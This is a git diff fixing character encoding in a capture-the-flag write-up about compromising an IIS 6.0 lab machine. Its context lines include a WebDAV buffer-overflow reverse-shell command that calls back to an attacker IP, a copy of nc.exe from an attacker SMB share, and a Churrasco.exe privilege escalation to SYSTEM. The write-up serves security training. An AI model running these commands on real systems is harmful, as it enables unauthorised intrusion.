@@ -141,7 +141,7 @@ python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.2 443
 
 ![reverse_shell_iis6](screenshots/reverse_shell_iis6.png)
 
-âœ… Reverse shell obtained.
+✅ Reverse shell obtained.
 
 ---
 ### 3.2 Post-exploitation enumeration
@@ -171,7 +171,7 @@ We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege
 
 Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. Instead, we use **Churrasco.exe**, a community version adapted for Windows Server 2003.
 
-Exploit reference: [Privilege Escalation â€“ Churrasco.exe](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)
+Exploit reference: [Privilege Escalation – Churrasco.exe](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)
 
 We upload `churrasco.exe` via an SMB share:
 
@@ -209,7 +209,7 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 
 ![whoami_churrasco](screenshots/whoami_churrasco.png)
 
-âœ… Privilege escalation successful â€“ we are `NT AUTHORITY\SYSTEM`.
+✅ Privilege escalation successful – we are `NT AUTHORITY\SYSTEM`.
 
 ### 4.2 Flags
 
@@ -221,19 +221,19 @@ dir C:\Documents and Settings\Administrator\Desktop
 
 ![root_user_flag](screenshots/root_user_flag.png)
 
-âœ… **User flag obtained**  
-âœ… **Root flag obtained**
+✅ **User flag obtained**  
+✅ **Root flag obtained**
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
 
-1. **Port Scanning** â†’ Detected IIS 6.0 on port 80.  
-2. **WebDAV Buffer Overflow (CVE-2017-7269)** â†’ Remote code execution with reverse shell.  
-3. **Privilege Escalation** â†’ Abused `SeImpersonatePrivilege` using **Churrasco.exe**.  
-4. **Post-Exploitation** â†’ Retrieved user and root flags as SYSTEM.
+1. **Port Scanning** → Detected IIS 6.0 on port 80.  
+2. **WebDAV Buffer Overflow (CVE-2017-7269)** → Remote code execution with reverse shell.  
+3. **Privilege Escalation** → Abused `SeImpersonatePrivilege` using **Churrasco.exe**.  
+4. **Post-Exploitation** → Retrieved user and root flags as SYSTEM.
 
 ---
 ## Defensive Recommendations
